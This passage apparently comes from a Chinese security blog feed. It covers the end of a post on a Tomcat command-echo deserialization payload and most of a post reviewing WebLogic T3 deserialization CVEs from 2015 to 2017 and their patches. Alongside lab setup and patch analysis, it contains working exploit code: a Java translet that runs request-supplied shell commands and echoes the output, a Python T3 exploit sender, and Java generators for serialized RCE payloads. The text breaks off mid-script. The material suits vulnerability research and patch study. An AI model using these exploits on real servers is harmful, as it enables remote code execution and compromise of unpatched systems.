<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.buf.ByteChunk;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.modeler.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.MBeanServer;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">tomcat72</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">tomcat72</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">MBeanServer</span> <span class="variable">mbeanServer</span> <span class="operator">=</span> Registry.getRegistry((Object)<span class="literal">null</span>, (Object)<span class="literal">null</span>).getMBeanServer();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.jmx.mbeanserver.JmxMBeanServer&quot;</span>).getDeclaredField(<span class="string">&quot;mbsInterceptor&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> field.get(mbeanServer);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">&quot;com.sun.jmx.interceptor.DefaultMBeanServerInterceptor&quot;</span>).getDeclaredField(<span class="string">&quot;repository&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">&quot;com.sun.jmx.mbeanserver.Repository&quot;</span>).getDeclaredField(<span class="string">&quot;domainTb&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">HashMap</span> <span class="variable">obj2</span> <span class="operator">=</span> (HashMap)field.get(obj);</span><br><span class="line">            obj = ((HashMap)obj2.get(<span class="string">&quot;Catalina&quot;</span>)).get(<span class="string">&quot;name=\&quot;http-bio-8888\&quot;,type=GlobalRequestProcessor&quot;</span>);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">&quot;com.sun.jmx.mbeanserver.NamedObject&quot;</span>).getDeclaredField(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">&quot;org.apache.tomcat.util.modeler.BaseModelMBean&quot;</span>).getDeclaredField(<span class="string">&quot;resource&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">&quot;org.apache.coyote.RequestGroupInfo&quot;</span>).getDeclaredField(<span class="string">&quot;processors&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ArrayList</span> <span class="variable">obj3</span> <span class="operator">=</span> (ArrayList)field.get(obj);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">&quot;org.apache.coyote.RequestInfo&quot;</span>).getDeclaredField(<span class="string">&quot;req&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                isLinux = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; obj3.size(); i++) &#123;</span><br><span class="line">                <span class="type">Request</span> <span class="variable">obj4</span> <span class="operator">=</span> (Request) field.get(obj3.get(i));</span><br><span class="line">                <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> obj4.getParameters().getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span>(username != <span class="literal">null</span>)&#123;</span><br><span class="line">                    String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, username&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>,  username&#125;;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    <span class="keyword">while</span> (s.hasNext())&#123;</span><br><span class="line">                        output += s.next();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="type">byte</span>[] buf = output.getBytes();</span><br><span class="line">                    <span class="type">ByteChunk</span> <span class="variable">bc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteChunk</span>();</span><br><span class="line">                    bc.setBytes(buf, <span class="number">0</span>, buf.length);</span><br><span class="line">                    obj4.getResponse().doWrite(bc);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="comment">//            System.out.println(&quot;=======================&quot;);</span></span><br><span class="line"><span class="comment">//            System.out.println(e);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>另外如果有师傅在复现的时候发现header超长，可以参考<a href="https://xz.aliyun.com/t/6227">缩小ysoserial payload体积的几个方法</a>。（也可以参考长亭师傅给的修改header头的思路，实际弄走的时候也许会遇到一些坑）</p>
<p>tomcat7+simple-shiro-web成功复现<br>
<img src="1585898629028-36d3e3fb-588d-4acd-8b68-a32c49da90a7.png#align=left&amp;display=inline&amp;height=541&amp;name=image.png&amp;originHeight=1082&amp;originWidth=2568&amp;size=511446&amp;status=done&amp;style=none&amp;width=1284" alt="image.png"></p>
<h2 id="最后">最后</h2>
<p>感谢大师傅们开源的自己的思路，学到很多。其次在研究这种方法的时候发现还有其他很多MBean，也许还有很多好玩的东西？</p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>weblogic历史T3反序列化漏洞及补丁梳理</title>
    <url>/2020/03/25/weblogic%E5%8E%86%E5%8F%B2T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81%E6%A2%B3%E7%90%86/</url>
    <content><![CDATA[<!-- 如题 -->
<!-- more -->
<h2 id="环境搭建">环境搭建</h2>
<p>使用ateam大哥开源的调试环境<a href="https://github.com/QAX-A-Team/WeblogicEnvironment">Weblogic环境搭建工具</a></p>
<h3 id="漏洞环境搭建">漏洞环境搭建</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build --build-arg JDK_PKG=jdk-7u21-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=wls1036_generic.jar  -t weblogic1036jdk7u21 .</span><br><span class="line">docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk7u21 weblogic1036jdk7u21</span><br></pre></td></tr></table></figure>
<h3 id="调试环境搭建">调试环境搭建</h3>
<p>将weblogic依赖的jar包拷贝出来并导入idea。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> wlserver1036</span><br><span class="line">docker <span class="built_in">cp</span> weblogic1036jdk7u21:/u01/app/oracle/middleware/modules ./wlserver1036</span><br><span class="line">docker <span class="built_in">cp</span> weblogic1036jdk7u21:/u01/app/oracle/middleware/wlserver/server/lib ./wlserver1036</span><br><span class="line">docker <span class="built_in">cp</span> weblogic1036jdk7u21:/u01/app/oracle/middleware/coherence_3.7/lib ./coherence_3.7/lib</span><br></pre></td></tr></table></figure>
<p><img src="1584628921983-32316897-d553-44d1-96f7-dac78f09b6b7.png" alt="image.png"></p>
<p>远程调试配置<br>
<img src="1584628994284-2bcf4d7e-e223-411e-ad60-c66f5bea1520.png" alt="image.png"></p>
<h2 id="T3-协议说明">T3 协议说明</h2>
<p>t3是oracle对rmi的增强，和rmi一样在网络间传输时数据是序列化过的。文章的重点在于分析漏洞以及补丁为什么可以绕过，就不分析t3协议数据的格式了，在复现时我们只需要将生成的恶意序列化数据套在py模版中即可。如果有师傅想对weblogic体系及其t3协议的正常使用感兴趣推荐阅读<a href="https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&amp;mid=2247485058&amp;idx=1&amp;sn=d22b310acf703a32d938a7087c8e8704">WebLogic安全研究报告</a>。</p>
<h2 id="CVE-2015-4852">CVE-2015-4852</h2>
<p>t3协议的传输过来的数据会在weblogic.rjvm.InboundMsgAbbrev#readObject中读取并进行反序列化。<br>
<img src="1584601233181-753caf13-53d7-4aac-8418-72313cad68bc.png" alt="image.png"><br>
因为是t3第一洞所以可以看到ServerChannelInputStream的resolveClass并没有任何做防御。<img src="1584601257106-fcbcd3bf-a03a-475c-b81e-b9a076e86ab2.png" alt="image.png"><br>
自带cc链<br>
<img src="1584628722500-b9b2433c-a6e7-47a8-ad72-91ff7179875c.png" alt="image.png"></p>
<p>所以只需要把ysoserial的生成的payload嵌入t3协议即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload1</span>(<span class="params">gadget, command</span>):</span><br><span class="line">    JAR_FILE = <span class="string">&#x27;/Users/cengsiqi/Desktop/javasectools/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar&#x27;</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, JAR_FILE, gadget, command], stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> popen.stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload2</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">host, port, payload</span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((host, port))</span><br><span class="line"></span><br><span class="line">    handshake = <span class="string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span>.encode()</span><br><span class="line">    sock.sendall(handshake)</span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;HELO:(.*).false&quot;</span>)</span><br><span class="line">    version = re.findall(pattern, data.decode())</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(version) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Weblogic&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Weblogic &#123;&#125;&quot;</span>.<span class="built_in">format</span>(version[<span class="number">0</span>]))</span><br><span class="line">    data_len = binascii.a2b_hex(<span class="string">b&quot;00000000&quot;</span>) <span class="comment">#数据包长度，先占位，后面会根据实际情况重新</span></span><br><span class="line">    t3header = binascii.a2b_hex(<span class="string">b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;</span>) <span class="comment">#t3协议头</span></span><br><span class="line">    flag = binascii.a2b_hex(<span class="string">b&quot;fe010000&quot;</span>) <span class="comment">#反序列化数据标志</span></span><br><span class="line">    payload = data_len + t3header + flag + payload</span><br><span class="line">    payload = struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, <span class="built_in">len</span>(payload)) + payload[<span class="number">4</span>:] <span class="comment">#重新计算数据包长度</span></span><br><span class="line">    sock.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line">    gadget = <span class="string">&quot;CommonsCollections1&quot;</span> <span class="comment">#CommonsCollections1 Jdk7u21</span></span><br><span class="line">    command = <span class="string">&quot;touch /tmp/CVE-2015-4852&quot;</span></span><br><span class="line"></span><br><span class="line">    payload = get_payload1(gadget, command)</span><br><span class="line">    exp(host, port, payload)</span><br></pre></td></tr></table></figure>
<h2 id="CVE-2015-4852的修复">CVE-2015-4852的修复</h2>
<p>补丁：2016年1月 p21984589_1036_Generic<br>
修复方法是在resolveClass中引入了 ClassFilter.isBlackListed进行过滤，跟进weblogic.rmi.ClassFilter可以看到黑名单内容。<br>
<img src="1584603275786-9f17f890-175d-49f5-95da-7eeaa1fcc48e.png" alt="image.png"></p>
<p><img src="1584933120054-b1f0b1cc-f9a7-4e35-a591-27af88d29ab2.png" alt="image.png"></p>
<p>除此之外，另外几个反序列化点也被加了相同的过滤（不一一打开看了）。<br>
<img src="1584629682488-1765cfe9-738d-46a7-8dcf-5341c7ac5c6f.png" alt="image.png"></p>
<p><strong>反序列化两个关键点，一个是触发反序列化的点，二是gadget。现在反序列化触发点有了，后面的t3的cve就是绕黑名单的各种技巧了。</strong></p>
<p>为了让后面的分析更具有说服力，这里以10.3.6为例说明如何打补丁。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it  -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk7u21 weblogic1036jdk7u21 /bin/bash</span><br><span class="line">docker <span class="built_in">cp</span> /Users/cengsiqi/Downloads/p21984589_1036_Generic weblogic1036jdk7u21:/p21984589_1036_Generic</span><br><span class="line">docker <span class="built_in">exec</span> -it weblogic1036jdk7u21 /bin/bash</span><br><span class="line"><span class="built_in">cd</span> /p21984589_1036_Generic</span><br><span class="line"><span class="built_in">mv</span> patch-catalog_23510.xml  patch-catalog.xml</span><br><span class="line"><span class="built_in">cd</span> /u01/app/oracle/middleware/utils/bsu</span><br><span class="line">./bsu.sh -install -patch_download_dir=/p21984589_1036_Generic -patchlist=S8C2 -prod_dir=/u01/app/oracle/middleware/wlserver/</span><br><span class="line">/u01/app/oracle/Domains/ExampleSilentWTDomain/bin/startWebLogic.sh</span><br></pre></td></tr></table></figure>
<p>如果打补丁时出现如下错误需要自行把bsu.sh中的内存参数MEM_ARGS调大一点。<br>
<img src="1584631227480-e3ca11bc-0c53-475e-9cd7-84828bef3c5f.png" alt="image.png"><br>
成功后截图如下<br>
<img src="1584631564760-944c5d18-1fa7-432a-b0bb-48b1a83e1379.png" alt="image.png"><br>
这时再尝试打会出现Unauthorized<br>
<img src="1584632143015-10d8cd9f-88ab-41dc-807d-14af2ab6ef9b.png" alt="image.png"></p>
<h2 id="CVE-2016-0638">CVE-2016-0638</h2>
<p>weblogic.jms.common.StreamMessageImpl没在黑名单，在其反序列化时会读取一段数据并进行反序列化，我们可以把这段数据伪造成rce payload。<br>
<img src="1584605337636-f9686a30-b0ee-4463-ac50-c0aa1727c272.png" alt="image.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> weblogic.jms.common.StreamMessageImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CVE_2016_0638</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = exec(<span class="string">&quot;CommonsCollections1&quot;</span>, <span class="string">&quot;touch /tmp/CVE_2016_0638&quot;</span>);</span><br><span class="line">        <span class="type">StreamMessageImpl</span> <span class="variable">streamMessage</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StreamMessageImpl</span>(payload);</span><br><span class="line">        ser(streamMessage, <span class="string">&quot;CVE_2016_0638.ser&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] exec(String gadget, String command) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        String[] cmd = &#123;<span class="string">&quot;java&quot;</span>, <span class="string">&quot;-jar&quot;</span>, <span class="string">&quot;/Users/cengsiqi/Desktop/javasectools/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar&quot;</span>, gadget, command&#125;;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">ser</span><span class="params">(Object obj, String serName)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(serName);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        System.out.println(<span class="string">&quot;-------序列化成功&quot;</span> + serName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>乱入一个QA<br>
Q：StreamMessageImpl可以过黑名单很好理解，但是为啥CommonsCollections1依旧可以成功，CommonsCollections1(org.apache.commons.collections.functors)不是在黑名单里面吗？</p>
<p>A：答案是ServerChannelInputStream没有过滤到org.apache.commons.collections.functors（废话）。细节是这样的：ServerChannelInputStream的resolveClass检验到是StreamMessageImpl，不在黑名单里面，通过。然后在反序列化流程中会调用StreamMessageImpl的readExternal，readExternal内部又new了新的ObjectInputStream（以后简称ois）并从缓冲区读反序列化数据再次调用readObject，这里原生的ois就是原生的resolveClass方法没有过滤。</p>
<h2 id="CVE-2016-0638的修复">CVE-2016-0638的修复</h2>
<p>补丁：2016年4月p22505423_1036_Generic<br>
把原生的ois换成了FilteringObjectInputStream<br>
<img src="1584696710445-285d9310-d737-4813-9851-acb1ec0cb88c.png" alt="image.png"></p>
<p><img src="1585128049921-46a472c4-7c3e-4e27-b89b-8158dc26c689.png" alt="image.png"></p>
<h2 id="CVE-2016-3510">CVE-2016-3510</h2>
<p>weblogic.corba.utils.MarshalledObject不在黑名单中，并且在readResolve的时候会读取objBytes的值赋给新new的ois。那么我们在objBytes中放入rce payload即可。<br>
<img src="1584673888248-d2782a8f-2687-4522-979d-648f5e9ebf9a.png" alt="image.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> weblogic.corba.utils.MarshalledObject;</span><br><span class="line"><span class="keyword">import</span> weblogic.jms.common.StreamMessageImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CVE_2016_3510</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = exec(<span class="string">&quot;CommonsCollections1&quot;</span>, <span class="string">&quot;touch /tmp/CVE_2016_3510&quot;</span>);</span><br><span class="line">        <span class="type">MarshalledObject</span> <span class="variable">marshalledObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MarshalledObject</span>(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> marshalledObject.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> cls.getDeclaredField(<span class="string">&quot;objBytes&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(marshalledObject, payload);</span><br><span class="line">        ser(marshalledObject,<span class="string">&quot;./CVE_2016_3510.ser&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] exec(String gadget, String command) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        String[] cmd = &#123;<span class="string">&quot;java&quot;</span>, <span class="string">&quot;-jar&quot;</span>, <span class="string">&quot;/Users/cengsiqi/Desktop/javasectools/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar&quot;</span>, gadget, command&#125;;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">ser</span><span class="params">(Object obj, String serName)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(serName);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        System.out.println(<span class="string">&quot;-------序列化成功&quot;</span> + serName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="CVE-2016-3510的修复">CVE-2016-3510的修复</h2>
<p>补丁：2016年10月 p23743997_1036_Generic<br>
重写了resolveClass方法，加了过滤。<br>
<img src="1584690943146-86f42e61-9803-4867-901f-18ceed907805.png" alt="image.png"></p>
<p><img src="1585129024461-13bed8a0-4c46-4d97-a8f4-6b89d07c44bb.png" alt="image.png"></p>
<h2 id="CVE-2017-3248">CVE-2017-3248</h2>
<p>利用JRMPClient进行带外rce，这个技巧相信看过<a href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html">橘子师傅shiro rce</a>的操作的师很熟悉了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload1</span>(<span class="params">gadget, command</span>):</span><br><span class="line">    JAR_FILE = <span class="string">&#x27;/Users/cengsiqi/Desktop/javasectools/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar&#x27;</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, JAR_FILE, gadget, command], stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> popen.stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload2</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">host, port, payload</span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((host, port))</span><br><span class="line"></span><br><span class="line">    handshake = <span class="string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span>.encode()</span><br><span class="line">    sock.sendall(handshake)</span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;HELO:(.*).false&quot;</span>)</span><br><span class="line">    version = re.findall(pattern, data.decode())</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(version) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Weblogic&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Weblogic &#123;&#125;&quot;</span>.<span class="built_in">format</span>(version[<span class="number">0</span>]))</span><br><span class="line">    data_len = binascii.a2b_hex(<span class="string">b&quot;00000000&quot;</span>) <span class="comment">#数据包长度，先占位，后面会根据实际情况重新</span></span><br><span class="line">    t3header = binascii.a2b_hex(<span 